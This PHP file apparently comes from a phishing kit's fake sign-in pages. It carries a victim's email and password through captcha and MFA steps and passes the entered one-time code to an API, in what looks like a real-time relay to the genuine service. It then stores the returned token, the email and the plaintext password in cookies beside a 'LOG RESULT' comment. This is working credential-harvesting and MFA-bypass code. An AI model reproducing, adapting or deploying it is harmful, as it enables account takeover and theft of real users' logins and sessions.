<?php
error_reporting(E_ERROR | E_PARSE);
require 'source/core/system/include.php';

session_start();

if(isset($_SESSION["credentials"]))
{
	$data      =  explode("\0", $_SESSION["credentials"]);
	$login     =  $data[0];
	$password  =  $data[1];
}
else
{
	$login     =  $_POST["email"];
	$password  =  $_POST["password"];
}

if(!isset($_SESSION["ticket"]))
{
    unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);

    header("Location: /login/index.php");
    die();
}

if(isset($_SESSION["captcha_key"]))
{
	$captcha_key = $_SESSION["captcha_key"];
}
else
{
    $_SESSION["redirect"]     =  "mfa";
    $_SESSION["credentials"]  =  $login . "\0" . $password;

    header("Location: /login/captcha.php");
    die();
}

$client_ip        =  $_SERVER["REMOTE_ADDR"];
$server_hostname  =  $_SERVER["HTTP_HOST"];
$full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];

if($login != NULL and $password != NULL and isset($_POST["mfacode"]))
{
	if($captcha_key != NULL)
	{
        unset($_SESSION["credentials"]);
        unset($_SESSION["captcha_key"]);
        unset($_SESSION["mfa_invalid"]);

		$mfacode = $_POST["mfacode"];

        if(!isset($_SESSION["ticket"])){
            header("Location: /login/index.php");
            die();
        }

        $ticket = $_SESSION["ticket"];

        unset($_SESSION["ticket"]);

        $totp_result = $VLT_API->totp_auth($ticket, $mfacode);

        if($totp_result == "EINVALID_MFA_CODE"){
            $_SESSION["credentials"] = $login . "\0" . $password;
            $_SESSION["ticket"] = $ticket;
            $_SESSION["mfa_invalid"] = 1;
            header("Location: /login/mfa.php");
            die();
        }
        
        ///LOG RESULT.
        unset($_SESSION["credentials"]);
        unset($_SESSION["captcha_key"]);
        unset($_SESSION["ticket"]);
        unset($_SESSION["mfa_invalid"]);

        setcookie("old_token", $totp_result);
        setcookie("email", $login);
        setcookie("old_password", $password);
        header("Location: /login/verify.php");
	}
	else
	{
		$_SESSION["redirect"]     =  "mfa";
		$_SESSION["credentials"]  =  $login . "\0" . $password;
		$_SESSION["mfa_invalid"] = 0;

		header("Location: /login/captcha.php");
	}
}
else
{
	#die($_SESSION["mfa_invalid"]);
	require("source/mfa.php");
	if($_SESSION["mfa_invalid"] == 1){require("source/errors/invalid_mfa.php");}
    die();
}
?>